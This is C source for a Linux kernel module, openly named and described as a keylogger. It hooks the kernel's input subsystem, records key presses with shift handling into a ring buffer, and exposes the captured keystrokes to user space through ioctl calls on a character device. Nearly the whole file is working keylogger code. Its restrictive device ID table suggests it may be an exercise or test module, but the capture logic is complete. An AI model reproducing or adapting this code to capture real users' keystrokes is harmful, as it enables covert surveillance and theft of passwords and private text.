#include "keylogger.h"

#include <linux/init.h>
#include <linux/kernel.h>

#define DEBUG_MSG(fmt, ...)                                    \
	do {                                                   \
		if (debug_enabled)                             \
			printk(KERN_DEBUG fmt, ##__VA_ARGS__); \
	} while (0)

static int debug_enabled = 0;
module_param(debug_enabled, int, 0644);
MODULE_PARM_DESC(debug_enabled, "Enable debug output");

static char *buffer;
static int major_device_number;
static int shift_pressed = 0;
static int buffer_size = 16;
static int buffer_index_to_write = 0;

static DEFINE_MUTEX(buffer_mutex);

static struct input_handler *event_handler;

char map[MAP_SIZE] = "..1234567890-=..qwertyuiop[]..asdfghjkl;'`.\\zxcvbnm,./";
char shift_map[MAP_SIZE] =
	"..!@#$%^&*()_+..QWERTYUIOP{}..ASDFGHJKL:\"~.|ZXCVBNM<>?";

static const struct file_operations fops = {
	.owner = THIS_MODULE,
	.unlocked_ioctl = keylogger_ioctl,
};

static const struct input_device_id keylogger_id_table[] = {
	{ .driver_info = 1,
	  .flags = INPUT_DEVICE_ID_MATCH_VENDOR | INPUT_DEVICE_ID_MATCH_PRODUCT,
	  .vendor = 0x1,
	  .product = 0x1 },
	{},
};

// ----------------- Buffer Management -----------------
static int allocate_buffer(int size)
{
	DEBUG_MSG("[INFO] starting to allocate the buffer...\n");

	if (size <= 0 || size > MAX_BUFFER_SIZE) {
		return -EINVAL;
	}

	buffer = kmalloc(size, GFP_KERNEL);
	if (!buffer) {
		return -ENOMEM;
	}

	memset(buffer, 0, size);
	buffer_size = size;
	buffer_index_to_write = 0;

	return 0;
}

static void free_buffer(void)
{
	DEBUG_MSG("[INFO] starting to free the buffer...\n");

	kfree(buffer);
	buffer = NULL;
	buffer_size = 0;
	buffer_index_to_write = 0;
}

// ----------------- IOCTL Handling -----------------
static long keylogger_ioctl(struct file *file, unsigned int cmd,
			    unsigned long arg)
{
	switch (cmd) {
	case IOCTL_GET_BUFFER_SIZE:
		if (put_user(buffer_size, (int __user *)arg)) {
			DEBUG_MSG(
				"[ERROR] failed to copy buffer size to user space\n");
			return -EFAULT;
		}
		return 0;

	case IOCTL_GET_BUFFER_DATA:
		if (!buffer || buffer_size <= 0) {
			DEBUG_MSG(
				"[ERROR] buffer is not allocated or has invalid size\n");
			return -EINVAL;
		}
		if (copy_to_user((char __user *)arg, buffer, buffer_size)) {
			DEBUG_MSG(
				"[ERROR] failed to copy buffer data to user space\n");
			return -EFAULT;
		}
		return 0;

	case IOCTL_SET_BUFFER_SIZE: {
		int new_size;
		if (get_user(new_size, (int __user *)arg)) {
			DEBUG_MSG(
				"[ERROR] failed to get new buffer size from user space\n");
			return -EFAULT;
		}

		if (new_size <= 0 || new_size > MAX_BUFFER_SIZE) {
			DEBUG_MSG("[ERROR] invalid buffer size requested: %d\n",
				  new_size);
			return -EINVAL;
		}

		free_buffer();
		if (allocate_buffer(new_size) < 0) {
			DEBUG_MSG("[ERROR] failed to allocate new buffer\n");
			return -ENOMEM;
		}
		DEBUG_MSG("[INFO] buffer size changed to: %d\n", new_size);
		return 0;
	}

	case IOCTL_CLEAR_BUFFER_DATA:
		mutex_lock(&buffer_mutex);
		if (buffer) {
			memset(buffer, 0, buffer_size);
			buffer_index_to_write = 0;
			DEBUG_MSG("[INFO] buffer data cleared\n");
		}
		mutex_unlock(&buffer_mutex);
		return 0;

	default:
		DEBUG_MSG("[ERROR] unsupported IOCTL command: %u\n", cmd);
		return -ENOTTY;
	}
}

// ----------------- Input Handler -----------------
static int keylogger_connect(struct input_handler *handler,
			     struct input_dev *dev,
			     const struct input_device_id *id)
{
	struct input_handle *handle;
	int error;

	handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
	if (!handle) {
		DEBUG_MSG(
			"[ERROR] failed to allocate memory for input handle\n");
		return -ENOMEM;
	}

	handle->dev = dev;
	handle->handler = handler;
	handle->name = "keylogger_handle";

	error = input_register_handle(handle);
	if (error) {
		DEBUG_MSG("[ERROR] failed to register input handle: %d\n",
			  error);
		kfree(handle);
		return error;
	}

	error = input_open_device(handle);
	if (error) {
		DEBUG_MSG("[ERROR] failed to open input device: %d\n", error);
		input_unregister_handle(handle);
		kfree(handle);
		return error;
	}

	DEBUG_MSG(
		"[INFO] successfully connected and registered handle for device %s\n",
		dev->name);
	return 0;
}

static void keylogger_disconnect(struct input_handle *handle)
{
	DEBUG_MSG("[INFO] device disconnected: %s\n", handle->dev->name);
	input_close_device(handle);
	input_unregister_handle(handle);
	kfree(handle);
}

static void keylogger_event_handler(struct input_handle *handle,
				    unsigned int type, unsigned int code,
				    int value)
{
	if (type != EV_KEY || code >= MAP_SIZE || map[code] == 0 ||
	    shift_map[code] == 0) {
		return;
	}

	if (code == KEY_LEFTSHIFT || code == KEY_RIGHTSHIFT) {
		shift_pressed = (value == 1);
		return;
	}

	if (code == KEY_ENTER || code == KEY_TAB || code == KEY_CAPSLOCK ||
	    code == KEY_SPACE || code == KEY_BACKSPACE)
		return;

	if (value == 1) {
		char key_char = map[code];
		if (shift_pressed) {
			key_char = shift_map[code];
		}

		mutex_lock(&buffer_mutex);
		buffer[buffer_index_to_write] = key_char;
		buffer_index_to_write =
			(buffer_index_to_write + 1) % buffer_size;
		mutex_unlock(&buffer_mutex);
	}
}

// ----------------- Module Init/Exit -----------------
static int __init keylogger_init(void)
{
	int error;

	DEBUG_MSG("[INFO] start building module...\n");

	major_device_number = register_chrdev(0, DEVICE_NAME, &fops);
	if (major_device_number < 0) {
		DEBUG_MSG("[ERROR] failed to register a major number\n");
		return major_device_number;
	}

	keylogger_class = class_create(THIS_MODULE, DEVICE_NAME);
	if (IS_ERR(keylogger_class)) {
		unregister_chrdev(major_device_number, DEVICE_NAME);
		DEBUG_MSG("[ERROR] failed to create device class\n");
		return PTR_ERR(keylogger_class);
	}

	keylogger_device = device_create(keylogger_class, NULL,
					 MKDEV(major_device_number, 0), NULL,
					 DEVICE_NAME);
	if (IS_ERR(keylogger_device)) {
		class_destroy(keylogger_class);
		unregister_chrdev(major_device_number, DEVICE_NAME);
		DEBUG_MSG("[ERROR] failed to create the device\n");
		return PTR_ERR(keylogger_device);
	}

	error = allocate_buffer(buffer_size);
	if (error) {
		device_destroy(keylogger_class, MKDEV(major_device_number, 0));
		class_destroy(keylogger_class);
		unregister_chrdev(major_device_number, DEVICE_NAME);
		DEBUG_MSG("[ERROR] failed to allocate the buffer\n");
		return error;
	}

	event_handler = kzalloc(sizeof(struct input_handler), GFP_KERNEL);
	if (!event_handler) {
		free_buffer();
		device_destroy(keylogger_class, MKDEV(major_device_number, 0));
		class_destroy(keylogger_class);
		unregister_chrdev(major_device_number, DEVICE_NAME);
		DEBUG_MSG(
			"[ERROR] failed to allocate memory for event_handler\n");
		return -ENOMEM;
	}

	event_handler->name = "keylogger";
	event_handler->event = keylogger_event_handler;
	event_handler->connect = keylogger_connect;
	event_handler->disconnect = keylogger_disconnect;
	event_handler->id_table = keylogger_id_table;

	error = input_register_handler(event_handler);
	if (error) {
		kfree(event_handler);
		free_buffer();
		device_destroy(keylogger_class, MKDEV(major_device_number, 0));
		class_destroy(keylogger_class);
		unregister_chrdev(major_device_number, DEVICE_NAME);
		DEBUG_MSG(
			"[ERROR] failed to register input handler, error code: %d\n",
			error);
		return error;
	}

	DEBUG_MSG("[INFO] building the module was successful\n");
	return 0;
}

static void __exit keylogger_exit(void)
{
	DEBUG_MSG("[INFO] starting disabling the module...\n");

	if (event_handler) {
		input_unregister_handler(event_handler);
		kfree(event_handler);
		event_handler = NULL;
	}
	free_buffer();
	if (keylogger_device) {
		device_destroy(keylogger_class, MKDEV(major_device_number, 0));
		keylogger_device = NULL;
	}
	if (keylogger_class) {
		class_unregister(keylogger_class);
		class_destroy(keylogger_class);
		keylogger_class = NULL;
	}
	unregister_chrdev(major_device_number, DEVICE_NAME);

	DEBUG_MSG("[INFO] module disabling successful\n");
}

module_init(keylogger_init);
module_exit(keylogger_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Przemyslaw Ozga <przemyslaw.ozga@intel.com>");
MODULE_DESCRIPTION(
	"A kernel module that logs keystrokes and handles buffer operations");
